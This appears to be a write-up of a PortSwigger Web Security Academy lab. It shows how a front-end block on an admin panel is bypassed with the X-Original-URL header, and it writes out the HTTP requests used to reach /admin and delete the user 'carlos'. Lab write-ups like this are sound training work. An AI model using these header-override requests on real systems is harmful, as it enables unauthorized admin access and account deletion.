# Bypassing URL-Based Access Control

This site hosts an unauthenticated admin panel at `/admin`, which a front-end layer is configured to block external access to. However, the back-end framework honors the `X-Original-URL` header, which can be abused to route around that block.

**Goal:** Reach the admin panel and delete the user `carlos`.

---

**Reference:**
- https://portswigger.net/web-security/access-control

<img width="762" height="491" alt="1" src="https://github.com/user-attachments/assets/5706cc93-898c-49d8-b0a8-4b6aba7d117e" />


---

Requesting `/admin` directly returns a 403:

<img width="978" height="384" alt="2" src="https://github.com/user-attachments/assets/625a0832-20bc-469a-9c24-fbd91e64b851" />


`/admin` can still be reached using:

```
GET / HTTP/2
...
X-Original-Url: /admin/
```

<img width="984" height="399" alt="3" src="https://github.com/user-attachments/assets/6eed6112-24cf-4415-a056-bf334ad1ce21" />


The user can then be deleted with this request. Note that the `username` parameter must be placed in the URL itself:

```
GET /?username=carlos HTTP/2
X-Original-Url: /admin/delete
```

<img width="742" height="384" alt="4" src="https://github.com/user-attachments/assets/5a43347f-7775-4f07-8bc0-e900c659aa6d" />

